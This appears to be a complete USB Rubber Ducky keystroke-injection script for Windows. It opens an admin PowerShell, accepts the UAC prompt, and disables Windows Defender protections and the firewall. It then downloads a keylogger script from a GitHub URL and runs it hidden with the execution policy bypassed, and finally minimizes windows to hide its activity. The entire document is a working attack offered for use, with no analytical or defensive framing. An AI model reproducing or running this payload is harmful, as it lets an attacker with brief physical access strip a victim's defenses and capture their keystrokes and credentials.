REM Step 1: Open PowerShell as Admin (Hidden)
DELAY 500
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500

REM Step 2: Disable Windows Defender Real-Time Protection
STRING powershell -windowstyle hidden -command "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
DELAY 500

REM Step 3: Disable Windows Firewall
STRING powershell -windowstyle hidden -command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
ENTER
DELAY 500

REM Step 4: Disable Windows Defender Antivirus
STRING powershell -windowstyle hidden -command "Set-MpPreference -DisableBehaviorMonitoring $true"
ENTER
DELAY 500
STRING powershell -windowstyle hidden -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
ENTER
DELAY 500
STRING powershell -windowstyle hidden -command "Set-MpPreference -DisableIOAVProtection $true"
ENTER
DELAY 500

REM Step 5: Download keylogger.ps1 from GitHub
STRING powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GSinghy/ducky/main/keylogger.ps1' -OutFile '$env:temp\\keylogger.ps1'"
ENTER
DELAY 500

REM Step 6: Run keylogger.ps1 in Hidden Mode with Execution Policy Bypass
STRING powershell -windowstyle hidden -command "Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $env:temp\\keylogger.ps1' -WindowStyle Hidden"
ENTER
DELAY 500

REM Step 7: Minimize All Windows to Avoid Visible Windows
STRING powershell -windowstyle hidden -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; [DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow();' -Name WinAPI -Namespace Utilities; [Utilities.WinAPI]::ShowWindowAsync([Utilities.WinAPI]::GetForegroundWindow(), 6)"
ENTER

REM Step 8: Close PowerShell to Complete Execution
STRING exit
ENTER
